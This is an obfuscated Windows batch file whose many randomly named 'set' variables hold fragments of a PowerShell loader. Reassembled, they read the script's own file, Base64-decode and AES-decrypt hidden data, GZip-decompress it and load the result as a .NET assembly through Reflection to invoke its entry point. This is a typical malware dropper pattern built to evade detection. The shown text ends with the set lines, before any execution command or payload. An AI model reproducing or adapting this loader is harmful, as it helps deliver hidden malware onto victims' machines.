@echo off
set "YSWbiIuuUa=py"
set "wYBadGpkmj=do"
set "XfPvqSPosY=32"
set "ZSqiWEJIiK=nd"
set "KYnosoWAYO=y "
set "kdWICYTYrv=we"
set "bjqXFvOOow=:\"
set "rKMIEIVYod= C"
set "LfFDbKmJaZ=st"
set "qrVhHfmSDT=we"
set "OgAFqlBNKc=he"
set "etmaYSaIze=ll"
set "KXDTyeHLsJ=in"
set "SLLuPcGUdG=.e"
set "wgnoqeDooe=0\"
set "opWmBtMTGa=em"
set "vNivhPCZwN=ow"
set "xQpnWNGCQD=rS"
set "tkxOqaBWXm=Po"
set "yueiPRosZu=Wi"
set "uZguxeCqrq=1."
set "qbkfNIwhqk=xe"
set "iSaEaekgHl=ll"
set "pKqiIVeUzk=rs"
set "XuYubNaCwR=\W"
set "ovrMtrLxyj=co"
set "tDYTdjShab=Sy"
set "bsjQpDVkRC=\v"
set "iSaALwJMiD= /"
set "ZHVNQxWuSc=he"
set "TGfxCWGETN=s\"
set "MXcLCvWKpN=po"
set "VXrbcUqBlN=ws"
set "TmcXyVueFF=cd"
set "YVFoiWJtVa= %~dp0"
set "UAMuShdKmG=Comp"
set "CGqhCFLRVz=wn.I"
set "QVHzEBinpi=[-1."
set "UXqWsfrAIA=U = "
set "FoneHZJscg=)($G"
set "FqILGNyGSR=rity"
set "PUHTzwxLVg=New-"
set "mIIDUqnqZL=$QgB"
set "CSmcXtcIGS=isfL"
set "vgXNxwPhMs=ne);"
set "CKHRPMZbfU=jSCr"
set "ItAJgymUPZ=F'[-"
set "pQdZijndJe=y]::"
set "cQaxKkbvJu=mory"
set "ivYBRuVGfb=);$j"
set "PZTpVsDCKu=gnir"
set "tqcRvJbPbf=se()"
set "dObUXdEWTq=);$j"
set "KqJkqvankz=CzNa"
set "VhFufvyamR=d;$j"
set "VzzaKErfPg=, $O"
set "HhSiobnSIt=.Cop"
set "FVBWgXkrzO=form"
set "IkYnCGuTeu=ewLi"
set "BofjsHdOst=yste"
set "QSmImoHJOk=.Con"
set "XWPxHmPMbE=$OWc"
set "HdwtkUceHy=iron"
set "blNHnHSpgB=Conv"
set "QilSXxflxm=Secu"
set "xZcnhTSzKA=;$un"
set "MYHjOtYqbm=] -j"
set "XdITtgtDOP===')"
set "QIKhGZLBmw=16] "
set "DUJdBiTwPT=-1.."
set "PXkbauVscz=urit"
set "nEScJvzKDP= = ["
set "iWpNdDeYoV=e]::"
set "zvTshPCaLR=Syst"
set "PKzvlaEElh=-nop"
set "jayaSXxVGP=)))"
set "HDfkGCVWMo=$jnd"
set "fXJgdyBxbM='gni"
set "cQwDNZhhRC=Secu"
set "pjIlmZKzBQ=Ik);"
set "MIzXCbYzFc=TllA"
set "gChVNcnDtG=[Env"
set "XvVrAHxvpk=+hAO"
set "EDyXutyZAR=Mode"
set "nCqoYDekkK=::De"
set "uVorcqwkBW= [Sy"
set "JKhHarZiZY=$OWc"
set "qIphWtKOdO=$CzN"
set "IwfHRcNnRj= New"
set "ylTOayXbjx=y.Pa"
set "KQmppxkFlg=lit("
set "ClWJvgnexe=ecry"
set "NZBOXWEFcJ=$QgB"
set "xutFKczBCm=grx."
set "FrzRlKYDCv=.Dis"
set "wSHTnzVMuO=ring"
set "ctHdiTgYWr=vj0m"
set "pnfZEHaiqL=m.IO"
set "SNevIzRPav=.Cre"
set "wHQYsAkhYA=ispo"
set "JFyVUDSTFr=[Sys"
set "KrjMYSzoGj=HO ="
set "jiKeTHtXcc=Fina"
set "EyXFBjirOa=1] -"
set "srMTsjhQoG=)) {"
set "zDkgvObQrX=ndwn"
set "pNWCCjXeJS=pDZz"
set "ydIfhtmSKI=('l0"
set "sWCMvYsHEI=.Mod"
set "HYXyeDzKuF=Obje"
set "oYWNHlJeCl=pose"
set "peLIfYvXVV=.Sec"
set "rskkIASljB=.Cry"
set "yhRfwjPPey=[IO."
set "PdRchLoEvQ=embl"
set "JtLwJGaqbJ=sGUc"
set "eNiBWjRBvd=vert"
set "kOVfpBPHlM=.GZi"
set "sTRBJqoOgG=[Sys"
set "dYeBvtBzgZ=ateD"
set "RzkyWDJOeR=orF'"
set "EzcIdlRfbd=.-16"
set "KguVnrNWyN='txe"
set "fXqsegebyx=Bmor"
set "RVBWgZnRtT=O.Me"
set "aGPOOvyiXm=k, 0"
set "FvqqfULixW=);$Q"
set "gLOdVUOWQU=saBm"
set "GQcfEmlodG=ose("
set "hUHZPxLzyB=ach "
set "ZJHdUerWvD=pStr"
set "xGNroIEpST=ndwn"
set "JzrWsYfXOy=yste"
set "vaHKwVEBhH=SCrN"
set "pfiBRNtbgt=Obje"
set "JxlSSYcvym=grx "
set "PcnFBuDSQf=rans"
set "BhltVsjJsv=]::("
set "kkwubldpzt=oin "
set "gUJPXHKWFJ=m.Re"
set "XvlalxdPvF=le  "
set "rkwtYTbLRy=lBlo"
set "DsGipYESYh=tem."
set "rQbmQeUkwj=tic "
set "qwvpPfyfXJ=Invo"
set "dXSLbSdEzU=Star"
set "VprsSGxHLU=$Tpg"
set "etdSyfKwlA=tsWi"
set "SjPXQUYBlR=S46e"
set "uthDAjlxae=c.En"
set "MMuibfGRjH=oryS"
set "RYrbaqbzJx=ljo."
set "WlpyFFpBsX=ress"
set "PWcjMJExuN=pher"
set "CSZYxxOcRU=.Len"
set "vyWHMxAdTs=morF"
set "nXOfJkjeZb=am ="
set "CLKhxKDkdo=join"
set "HJpDdEvceP=.Key"
set "dJjooYZWmt=ect "
set "ClJNMCZwAK=iVZ."
set "KEmryklEDu=SPWy"
set "jYODYzZwLY== [S"
set "ybTVfdksjz=Stre"
set "AYZhbCNkyb=y.Ci"
set "jTLcsKtMfx=rt]:"
set "IaZfaRqLuh=eam("
set "WHtwVCXrRz=Fo7l"
set "vclgyjeuPm=t Sy"
set "kEomUndaGd=();$"
set "MSEUHDwcSx=y.Cr"
set "XDnUkZpDSQ=bstr"
set "vzFUtzmZtn=zlU."
set "OkwCUMUOQH=;$pu"
set "mZdlKcvsfY= = $"
set "EPsjGrBPOu=1..-"
set "nDSnCWgpHD=yTo("
set "aNtKpbCPmQ=HO);"
set "WFEoQSnELW=ZYYc"
set "WCsfpwZSON=yste"
set "iNxEknchIM=7;$j"
set "pbfpTnmRkn='[-1"
set "DHWGBIFfGh=trea"
set "FWIhRgYdPs=WcIk"
set "NjJiyQcFQc=N = "
set "DayQfOEsCX=em.I"
set "koIPZbbdBD=6] -"
set "mMsVxSVDgO=k = "
set "POwTsJHTNT=6esa"
set "qaGhOhHnYM=puzl"
set "QePToaEMxb=, (,"
set "FVNQkabENJ=-Obj"
set "buexTAABjh=($ts"
set "WtcvaItzHZ=OyzA"
set "YtSzFhMOrS= '')"
set "dKnkKwnsSw=$QgB"
set "bWgLdmorTO=ct S"
set "AxTSoptsFP=;$Jl"
set "wMvPdpztJu=ose("
set "zgfjxTATrW=);$j"
set "GGgdySNpKg=.Mem"
set "ylVjEbZZik=pres"
set "lkjMgoaqnS=gMod"
set "fzcmeLkkeH=.Cry"
set "YqkqkStPqr=0O+g"
set "MFweSDzTnt=iVZ "
set "ILYlxnzcJe=stem"
set "gIrAoqqCbA=ypto"
set "QZLPeefBDX=V = "
set "yLivNMiHXK=ay()"
set "mzxhNQdzNK=('%~f0'"
set "liSzKSgoGT=HO.T"
set "avbfpnPIAl=ode]"
set "wSnHiozUpz= = $"
set "ImzOXXzcNH=jndw"
set "hdYMNRitiz=$jSC"
set "XldBuGxmhN=ptor"
set "WAmggCYDIv=]::("
set "YXwXdppZGq=.Ass"
set "JWVosGqRWT=stem"
set "ARFFbFwzqh=.Dis"
set "eUdkLWNsTj=).Sp"
set "XFjXXAUxeF=nirt"
set "BejfzWbsOu=3); "
set "aqGIkXdyMf=ress"
set "wUhzoeJSiD=:: '"
set "YpUbFREyqE=oint"
set "YRmeKwqHks= if "
set "UzQUTNfuvi=Z.Su"
set "ejmoMkXlQM=ct S"
set "OUaOsbdnWX=New-"
set "uDPzRCxRmB=ndwn"
set "viLQvxoANQ=('%*'"
set "onLhpTYwuN=..-1"
set "PeLeaiPPPI=fore"
set "sTcxMsmtty=::('"
set "XSqxTndnQa=stem"
set "rOfnbELIBI= [Sy"
set "KHIyjOPTGj=g = "
set "WPjFxyRlgh=comm"
set "JpfDiNwYTF=-ep "
set "FmNIJNizsi=th('"
set "kRBIUaXTbo=null"
set "TKTvIvDEFU=ion."
set "QWLkqSiUiV=ptog"
set "WmUeEzkSvO=ionM"
set "PoTEUHFdks=rN.D"
set "AWqCyGTxRZ=Syst"
set "kkmsEGriMT=OWcI"
set "AXLnaseYHl=tS46"
set "sfnTDnjwEb=v4Ir"
set "RDlaeRjjcn=  $G"
